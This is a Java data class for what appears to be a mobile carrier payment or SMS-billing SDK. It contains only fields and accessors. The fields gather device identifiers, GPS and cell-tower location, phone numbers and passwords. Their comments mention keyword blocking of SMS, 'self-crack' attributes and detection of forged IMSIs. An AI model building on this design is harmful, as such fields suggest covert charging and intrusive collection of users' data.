package com.klw.fastfun.pay.common.domain;

import java.io.Serializable;
import java.util.List;

/**
 * 
 * @author ouyangsu 20150329
 */
public class OrderReqInfo implements Serializable {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;

	/** 订单ID,格式：月份+代码类型+16位编号 */
	private String ffId;
	/** cpId */
	private String cpId;
	/** imsi */
	private String imsi;
	/** imei */
	private String imei;
	/** iccid */
	private String iccid;
	/** sp编号 */
	private String spId;
	/** 手机型号 */
	private String pmodel;
	/** 系统版本 */
	private String osversion;
	/** 网络类型 */
	private String nwtype;
	/** 通信制式 */
	private String ctech;
	/** 价格 */
	private int fee;
	/** 价格 */
	private String price;
	/** ip */
	private String ip;
	/** 省份 */
	private String province;
	/** cp自定义扩展字段 */
	private String cpParam;
	/** 是否同步 */
	private int isSyn;
	/** 是否计费成功 */
	private int isSuccess;
	/** 通知状态 */
	private int synStatus;
	/** 手机号 */
	private String mobile;
	/** 包名 */
	private String pck;
	/** 应用名称 */
	private String app;
	/** 3.1.8自破解需要属性 */
	private String enMethod;
	/** 3.1.8自破解需要属性 */
	private int count;
	/** 在线地址 */
	private String url;
	/** url编号 */
	private int urlNo;
	/** 1:get 2:post */
	private int reqMethod;
	/** 屏蔽关键字 */
	private String keyword;
	/** 匹配正则表达式 */
	private String matchRegex;
	/** 基站信息 */
	private String bscCid;
	/** 基站信息 */
	private String bscLac;
	/** 经度 */
	private String gpsLng;
	/** 纬度 */
	private String gpsLat;
	/** 能计费的价格 */
	private String fees;
	/** 开始时间 */
	private String startTime;
	/** 结束时间 */
	private String endTime;
	/** 请求次数 */
	private String num;
	/** aimsi判断imsi是否为真1为真0为伪造 */
	private String aimsi;
	/** 延时请求毫秒数 */
	private String wait_time;
	/** sdk版本号 */
	private String sdkVer;
	/** MMappid */
	private String mmAppid;
	/** mmChannel */
	private String mmChannel;
	/** 请求入口标记 */
	private String reqFlag;
	/** 省市具体到市 */
	private String city;
	/** 通道名称 */
	private String spName;
	/** 指令信息 */
	private String sms;
	/** 游戏名称 */
	private String gamename;
	/** 道具名称 */
	private String propname;
	/** 消息码 */
	private int msgNum;
	/** 消息*/
	private String msg;
	/** 1允许混合,0不允许混合*/
	private int isMix;
	/** 1移动 2联通 3电信 */
	private int codeType;
	/** 屏蔽信息 */
	private List<ResSDKFilter> filterrsp;
	/** 获取支付数据后，延时执行支付的时间，毫秒 */
	private String delayed;
	/** 订单号 */
	private String orderId;
	/** 用户名 */
	private String username;
	/** 密码 */
	private String password;
	/** 验证码 */
	private String code;
	/** 交易号 */
	private String traid;
	/** 1移动 2联通 3电信 */
	private int phoneType;
	/** 下行内容 */
	private String smscontent;
	/** 微信openid */
	private String openid;
	/** 支付回调页面 */
	private String callbackurl;
	/** 买家支付宝账号 */
	private String buyerLogonId;
	/** 变更新的ffid */
	private String newffid;
	/** 返回客户端内容 */
	private RegisterRes reg;
	private XSPayCodeInfo paycode;
	private String tab;
	private String body;
	private String reqResult;
	private String smsport;
 
	public String getSmsport() {
		return smsport;
	}
	public void setSmsport(String smsport) {
		this.smsport = smsport;
	}
	public String getReqResult() {
		return reqResult;
	}
	public void setReqResult(String reqResult) {
		this.reqResult = reqResult;
	}
	public String getBody() {
		return body;
	}
	public void setBody(String body) {
		this.body = body;
	}

	public String getNewffid() {
		return newffid;
	}

	public void setNewffid(String newffid) {
		this.newffid = newffid;
	}

	public String getBuyerLogonId() {
		return buyerLogonId;
	}

	public void setBuyerLogonId(String buyerLogonId) {
		this.buyerLogonId = buyerLogonId;
	}

	public String getTab() {
		return tab;
	}

	public void setTab(String tab) {
		this.tab = tab;
	}

	public XSPayCodeInfo getPaycode() {
		return paycode;
	}

	public void setPaycode(XSPayCodeInfo paycode) {
		this.paycode = paycode;
	}

	public String getCallbackurl() {
		return callbackurl;
	}

	public void setCallbackurl(String callbackurl) {
		this.callbackurl = callbackurl;
	}

	public String getOpenid() {
		return openid;
	}

	public void setOpenid(String openid) {
		this.openid = openid;
	}

	public RegisterRes getReg() {
		return reg;
	}

	public void setReg(RegisterRes reg) {
		this.reg = reg;
	}

	public String getSmscontent() {
		return smscontent;
	}

	public void setSmscontent(String smscontent) {
		this.smscontent = smscontent;
	}

	public String getTraid() {
		return traid;
	}

	public void setTraid(String traid) {
		this.traid = traid;
	}

	public String getCode() {
		return code;
	}

	public void setCode(String code) {
		this.code = code;
	}

	public int getPhoneType() {
		return phoneType;
	}

	public void setPhoneType(int phoneType) {
		this.phoneType = phoneType;
	}

	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getPassword() {
		return password;
	}

	public void setPassword(String password) {
		this.password = password;
	}

	public String getOrderId() {
		return orderId;
	}

	public void setOrderId(String orderId) {
		this.orderId = orderId;
	}

	public String getDelayed() {
		return delayed;
	}

	public void setDelayed(String delayed) {
		this.delayed = delayed;
	}

	public String getPrice() {
		return price;
	}

	public void setPrice(String price) {
		this.price = price;
	}

	public int getCodeType() {
		return codeType;
	}

	public void setCodeType(int codeType) {
		this.codeType = codeType;
	}

	public int getMsgNum() {
		return msgNum;
	}

	public void setMsgNum(int msgNum) {
		this.msgNum = msgNum;
	}

	public int getIsMix() {
		return isMix;
	}

	public void setIsMix(int isMix) {
		this.isMix = isMix;
	}

	public String getMsg() {
		return msg;
	}

	public void setMsg(String msg) {
		this.msg = msg;
	}

	public String getGamename() {
		return gamename;
	}

	public void setGamename(String gamename) {
		this.gamename = gamename;
	}

	public String getPropname() {
		return propname;
	}

	public void setPropname(String propname) {
		this.propname = propname;
	}

	public List<ResSDKFilter> getFilterrsp() {
		return filterrsp;
	}

	public void setFilterrsp(List<ResSDKFilter> filterrsp) {
		this.filterrsp = filterrsp;
	}

	public String getSpName() {
		return spName;
	}

	public void setSpName(String spName) {
		this.spName = spName;
	}

	public String getSms() {
		return sms;
	}

	public void setSms(String sms) {
		this.sms = sms;
	}

	public String getCity() {
		return city;
	}

	public void setCity(String city) {
		this.city = city;
	}

	public String getReqFlag() {
		return reqFlag;
	}

	public void setReqFlag(String reqFlag) {
		this.reqFlag = reqFlag;
	}

	public String getMmAppid() {
		return mmAppid;
	}

	public void setMmAppid(String mmAppid) {
		this.mmAppid = mmAppid;
	}

	public String getMmChannel() {
		return mmChannel;
	}

	public void setMmChannel(String mmChannel) {
		this.mmChannel = mmChannel;
	}

	public String getSdkVer() {
		return sdkVer;
	}

	public void setSdkVer(String sdkVer) {
		this.sdkVer = sdkVer;
	}

	public String getWait_time() {
		return wait_time;
	}

	public void setWait_time(String wait_time) {
		this.wait_time = wait_time;
	}

	public String getAimsi() {
		return aimsi;
	}

	public void setAimsi(String aimsi) {
		this.aimsi = aimsi;
	}

	public String getNum() {
		return num;
	}

	public void setNum(String num) {
		this.num = num;
	}

	public String getStartTime() {
		return startTime;
	}

	public void setStartTime(String startTime) {
		this.startTime = startTime;
	}

	public String getEndTime() {
		return endTime;
	}

	public void setEndTime(String endTime) {
		this.endTime = endTime;
	}

	public String getFees() {
		return fees;
	}

	public void setFees(String fees) {
		this.fees = fees;
	}

	public String getBscCid() {
		return bscCid;
	}

	public void setBscCid(String bscCid) {
		this.bscCid = bscCid;
	}

	public String getBscLac() {
		return bscLac;
	}

	public void setBscLac(String bscLac) {
		this.bscLac = bscLac;
	}

	public String getGpsLng() {
		return gpsLng;
	}

	public void setGpsLng(String gpsLng) {
		this.gpsLng = gpsLng;
	}

	public String getGpsLat() {
		return gpsLat;
	}

	public void setGpsLat(String gpsLat) {
		this.gpsLat = gpsLat;
	}

	public String getKeyword() {
		return keyword;
	}

	public void setKeyword(String keyword) {
		this.keyword = keyword;
	}

	public String getMatchRegex() {
		return matchRegex;
	}

	public void setMatchRegex(String matchRegex) {
		this.matchRegex = matchRegex;
	}

	public int getReqMethod() {
		return reqMethod;
	}

	public void setReqMethod(int reqMethod) {
		this.reqMethod = reqMethod;
	}

	public String getUrl() {
		return url;
	}

	public void setUrl(String url) {
		this.url = url;
	}

	public int getUrlNo() {
		return urlNo;
	}

	public void setUrlNo(int urlNo) {
		this.urlNo = urlNo;
	}

	public String getEnMethod() {
		return enMethod;
	}

	public void setEnMethod(String enMethod) {
		this.enMethod = enMethod;
	}

	public int getCount() {
		return count;
	}

	public void setCount(int count) {
		this.count = count;
	}

	public String getPck() {
		return pck;
	}

	public void setPck(String pck) {
		this.pck = pck;
	}

	public String getApp() {
		return app;
	}

	public void setApp(String app) {
		this.app = app;
	}

	public String getIccid() {
		return iccid;
	}

	public void setIccid(String iccid) {
		this.iccid = iccid;
	}

	public String getMobile() {
		return mobile;
	}

	public void setMobile(String mobile) {
		this.mobile = mobile;
	}

	public String getFfId() {
		return ffId;
	}

	public void setFfId(String ffId) {
		this.ffId = ffId;
	}

	public String getCpId() {
		return cpId;
	}

	public void setCpId(String cpId) {
		this.cpId = cpId;
	}

	public String getImsi() {
		return imsi;
	}

	public void setImsi(String imsi) {
		this.imsi = imsi;
	}

	public String getImei() {
		return imei;
	}

	public void setImei(String imei) {
		this.imei = imei;
	}

	public String getSpId() {
		return spId;
	}

	public void setSpId(String spId) {
		this.spId = spId;
	}

	public int getFee() {
		return fee;
	}

	public void setFee(int fee) {
		this.fee = fee;
	}

	public String getIp() {
		return ip;
	}

	public void setIp(String ip) {
		this.ip = ip;
	}

	public String getProvince() {
		return province;
	}

	public void setProvince(String province) {
		this.province = province;
	}

	public String getCpParam() {
		return cpParam;
	}

	public void setCpParam(String cpParam) {
		this.cpParam = cpParam;
	}

	public int getIsSyn() {
		return isSyn;
	}

	public void setIsSyn(int isSyn) {
		this.isSyn = isSyn;
	}

	public int getSynStatus() {
		return synStatus;
	}

	public void setSynStatus(int synStatus) {
		this.synStatus = synStatus;
	}

	public int getIsSuccess() {
		return isSuccess;
	}

	public void setIsSuccess(int isSuccess) {
		this.isSuccess = isSuccess;
	}

	public String getPmodel() {
		return pmodel;
	}

	public void setPmodel(String pmodel) {
		this.pmodel = pmodel;
	}

	public String getOsversion() {
		return osversion;
	}

	public void setOsversion(String osversion) {
		this.osversion = osversion;
	}

	public String getNwtype() {
		return nwtype;
	}

	public void setNwtype(String nwtype) {
		this.nwtype = nwtype;
	}

	public String getCtech() {
		return ctech;
	}

	public void setCtech(String ctech) {
		this.ctech = ctech;
	}
}
